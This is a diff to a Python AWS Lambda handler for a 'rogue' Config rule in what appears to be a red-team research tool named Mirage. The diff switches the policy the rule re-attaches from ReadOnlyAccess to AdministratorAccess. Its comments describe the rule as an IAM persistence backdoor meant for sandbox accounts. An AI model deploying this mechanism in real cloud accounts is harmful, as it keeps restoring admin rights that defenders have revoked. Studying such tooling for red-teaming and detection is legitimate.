@@ -2,8 +2,9 @@
 Rogue Config rule Lambda handler — IAM Roles.
 
 Inverted logic: flags an IAM role as NON_COMPLIANT when it does NOT have
-a specific managed policy attached (i.e., when the policy was removed/revoked).
-Remediation re-attaches the policy.
+the backdoor policy attached. Remediation re-attaches the policy.
+
+The default backdoor is AWS-managed AdministratorAccess. Sandbox accounts only.
 """
 import json
 import boto3
@@ -11,9 +12,10 @@ import boto3
 config_client = boto3.client("config")
 iam_client = boto3.client("iam")
 
-# The policy Mirage will keep re-attaching. In a real attack this would be
-# something like AdministratorAccess or a custom backdoor policy.
-TARGET_POLICY_ARN = "arn:aws:iam::aws:policy/ReadOnlyAccess"
+# The policy Mirage keeps re-attaching. AdministratorAccess is the canonical
+# IAM persistence backdoor — chosen here because the project is a research
+# tool and this is what a real attacker would do. Sandbox only.
+TARGET_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"
 
 
 def lambda_handler(event, context):
